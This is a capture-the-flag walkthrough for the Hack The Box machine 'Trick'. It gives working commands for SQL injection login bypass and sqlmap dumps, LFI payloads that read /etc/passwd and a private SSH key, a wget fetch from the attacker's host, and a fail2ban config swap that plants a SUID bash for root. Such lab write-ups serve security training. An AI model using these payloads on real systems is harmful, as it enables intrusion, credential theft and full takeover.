# Trick: Easy

```sh
sudo vim /etc/hosts
# add trick.htb

nmap -T4 -p- -A -Pn -v trick.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 7.9p1 Debian 10+deb10u2
    * 25/tcp: smtp
    * 53/tcp: domain: ISC BIND 9.11.5-P4-5.1+deb10u7
    * 80/tcp: http: nginx 1.14.2

* enumerating SMTP:

    ```sh
    telnet trick.htb 25
    # gives 220 status code

    VRFY root
    # we get a positive response for 'root' username

    VRFY test
    # 'user unknown' error

    QUIT

    # we can use username enum scripts

    smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.129.227.180
    # this does not give anything
    ```

* enumerating DNS:

    ```sh
    # check for zone transfers

    dig axfr @10.129.227.180 trick.htb
    # this gives some subdomains

    sudo vim /etc/hosts
    # update subdomains
    ```

* using ```dig axfr``` command to check for DNS zone transfers, we get additional subdomains: 'preprod-payroll.trick.htb' and 'root.trick.htb': update the entries in ```/etc/hosts```

* checking the webpage for 'http://trick.htb', we have a website that is in development, with no outgoing links or any useful info

* checking the subdomain at 'http://preprod-payroll.trick.htb', we are redirected to a login page at '/login.php': titled "Admin | Employee's Payroll Management System"

* the login form has fields for username and password; trying common creds like 'admin:admin' and 'admin:password' fails

* using Burp Suite, we can intercept a login request to check the format

* the login request is a POST call to '/ajax.php?action=login' with the data parameters 'username' and 'password'

* checking the source code shows two more URLs: '/index.php?page=home' and '/voting.php': as part of the login form logic

* trying to navigate to '/voting.php' leads to a 404 error; and checking the '/index.php?page=home' page redirects to the login page

* if we try accessing the '/home.php' page, we get a page with the words 'Welcome back'

* we can try searching for any exploits associated with the webapp: we can search using terms like "Employee's Payroll Management System" and "Payroll Management System"

* this leads us to a [SQLi authentication bypass exploit for "Simple Payroll System 1.0"](https://www.exploit-db.com/exploits/50403): we can try it

* the exploit mentions we can login using the payload ```' or 1=1-- ``` as username/password

* trying this in '/login.php' works and we get access to the dashboard page titled 'Recruitment Management System', and we have multiple pages on the sidebar

* we can explore the available pages for any secrets

* the users page shows a single admin user 'Enemigosss' configured, but no other info is given

* we can try gathering more info using ```sqlmap``` by trying to dump the DB:

    ```sh
    # intercept and save login request from Burp Suite to file

    sqlmap -r login.req --batch --dump
    # this works

    sqlmap -r login.req --batch --dump -T users
    # dump only 'users' table
    ```

* the 'users' table from the SQL DB dump gives us the creds 'Enemigosss:SuperGucciRainbowCake'

* we can try logging into SSH using these creds but it does not work

* as we do not have any RCE exploits for the webapp software, and there are no options to upload anything in the web system, we need to find alternative ways to get RCE

* we can check for any command execution or RCE features via ```sqlmap```:

    ```sh
    sqlmap -r login.req --batch --current-user --current-db --is-dba
    # get current user and DB name
    # and check if user is DBA

    sqlmap -r login.req --batch --current-user --current-db --privileges
    # check for any privs
    ```

* using the ```--current-user``` command shows the username 'remo' as current user, and the user is not a DBA

* if we check for all privileges using the ```--privileges``` option, we get the privilege ```FILE```

* Googling for ```FILE``` privileges and how it can be abused with ```sqlmap``` shows that this gives us read/write permissions

* so, we can use ```sqlmap``` to get RCE:

    ```sh
    sqlmap -r login.req --batch --os-shell
    # this tries to upload file stager to '/var/www/payroll' but fails

    sqlmap -r login.req --batch --file-read "/etc/passwd"
    # check for file read
    # this works

    # to speed up, we can use a specific technique like boolean-based technique
    # as the default blind technique is slower

    sqlmap -r login.req --batch --file-read "/etc/passwd" --risk=3 --level=5 --technique="B" -p username
    # boolean technique specified

    # check the locally saved file copy
    ```

* while ```--os-shell``` fails for RCE, we have file read permissions: and we can read ```/etc/passwd```, which shows local user 'michael'

* next, to determine the possible webroot paths, as the server is running on ```nginx```, we can check for files like ```/etc/nginx/sites-enabled/default``` & ```/etc/nginx/conf/nginx.conf```:

    ```sh
    sqlmap -r login.req --batch --file-read "/etc/nginx/sites-enabled/default" --risk=3 --level=5 --technique="B" -p username
    ```

* checking the file ```/etc/nginx/sites-enabled/default``` gives the following info:

    * the domain 'trick.htb' is mapped to webroot ```/var/www/html```
    * the subdomain 'preprod-payroll.trick.htb' is mapped to ```/var/www/payroll```
    * there is an additional subdomain 'preprod-marketing.trick.htb', mapped to ```/var/www/market```

* we can try writing files in the webroot directories first: we can use a basic webshell to test:

    ```sh
    cp /usr/share/webshells/php/simple-backdoor.php .

    sqlmap -r login.req --batch --file-write "simple-backdoor.php" --file-dest "/var/www/html/webshell.php"

    sqlmap -r login.req --batch --file-write "simple-backdoor.php" --file-dest "/var/www/payroll/webshell.php"

    sqlmap -r login.req --batch --file-write "simple-backdoor.php" --file-dest "/var/www/market/webshell.php"
    # this does not work
    ```

* the file write attempts using ```sqlmap``` fail: it is likely that the user does not have write permissions in the webroot paths

* we can check the new subdomain 'preprod-marketing.trick.htb': update the entry in ```/etc/hosts```

* the marketing webpage does not have any useful content, and the links to other pages use the 'page' parameter: for example, 'http://preprod-marketing.trick.htb/index.php?page=services.html'

* we can try parameter fuzzing to check for LFI:

    ```sh
    ffuf -u 'http://preprod-marketing.trick.htb/index.php?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
    # filter false positives with 0 size
    ```

* the LFI fuzzing works and we get responses using payloads like ```....//....//....//etc/passwd```

* we can test for common Linux filepaths:

    ```sh
    curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd'
    # this works

    # check for SSH keys for user 'michael'

    curl 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa'
    # this works
    ```

* as ```/etc/passwd``` mentions the local user 'michael', we can check for any readable SSH keys: and this gives us a file at ```/home/michael/.ssh/id_rsa```

* we can copy the keyfile and try to crack it:

    ```sh
    vim michael_rsa
    # paste key contents

    ssh2john michael_rsa > michael_hash
    # this gives us the error "no password"
    ```

* trying to crack the keyfile shows that it has no password: so we can try to use it directly to login as 'michael':

    ```sh
    chmod 600 michael_rsa

    ssh -i michael_rsa michael@trick.htb
    # this works

    cat user.txt
    # user flag

    ls -la
    # check other files

    sudo -l
    ```

* ```sudo -l``` shows that user 'michael' can run the following command as root without password: ```/etc/init.d/fail2ban restart```

* we can do further enumeration using ```linpeas``` - fetch script from attacker:

    ```sh
    wget http://10.10.14.64:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.19.0-20-amd64
    * user 'michael' is part of a non-default group 'security'
    * group 'security' has write permissions on ```/etc/fail2ban/action.d``` directory

* Googling for any exploits or privesc vectors associated with ```fail2ban``` leads to [this post abusing a misconfiguration for writable files](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7)

* the post highlights how write permissions over certain ```fail2ban``` config files, followed by a restart of the service, can be exploited for privesc

* we can follow the steps from the article:

    * verify we have write permissions for the config files using ```ls -la /etc/fail2ban/action.d```

    * checking the file permissions shows that we have write permissions on the directory, but not on the individual files, so we can copy the file, edit it, and replace the original file with a malicious file

    * ```fail2ban``` config file is located at ```/etc/fail2ban/jail.conf``` - and this file has multiple services configured, and the ban action to take in case of failed auth attempts

    * for a config file modification to take place, the restart of ```fail2ban``` service is needed: we have this privilege as checked using ```sudo -l```

    * we can check for enabled services in the ```jail.conf``` file:

        ```sh
        grep -C 2 "enabled = true" /etc/fail2ban/jail.conf
        # '-C 2' to print 2 lines before and after match, for identifying services
        ```
    
    * checking this shows that only ```sshd``` service has ```fail2ban``` enabled by default

    * similarly, checking the ```jail.conf``` file shows that the ban actions are also kept to default settings: similar to the article

    * the 'banaction' variable in the config file has the value 'iptables-multiport': which means the corresponding config file in the ```action.d/``` directory will have the ban action steps

    * to exploit this, we can modify ```/etc/fail2ban/action.d/iptables-multiport.conf``` to change behaviour from blocking IP to creating a SUID-set copy of ```bash``` binary:

        ```sh
        cat /etc/fail2ban/action.d/iptables-multiport.conf
        # review config file
        # we need to modify the 'actionban' variable command

        cp /etc/fail2ban/action.d/iptables-multiport.conf .
        # create a copy to home directory, where we can edit it

        vim iptables-multiport.conf
        # modify 'actionban' command with malicious command

        mv iptables-multiport.conf /etc/fail2ban/action.d/
        # replace the file with same name
        ```
    
    * replace the 'actionban' variable command with a command like ```cp /bin/bash /tmp/bash && chmod 4777 /tmp/bash```, and ensure the config file is replaced (simply using ```chmod +s``` did not work in this case)

    * now, we can restart the service using ```sudo /etc/init.d/fail2ban restart```

    * next, we need to do a bannable offence: according to the default settings in ```jail.conf```, we have 5 auth attempts before the host gets banned

    * we can use ```hydra``` to do the failed SSH attempts:

        ```sh
        # on attacker

        hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://trick.htb
        ```
    
    * after a minute or two, once enough bruteforce attempts are done, we can check if the ```bash``` copy is created on target:

        ```sh
        ls -la /tmp
        # we have the SUID-bit set

        /tmp/bash -p
        # this works and we get root

        cat /root/root.txt
        # root flag
        ```
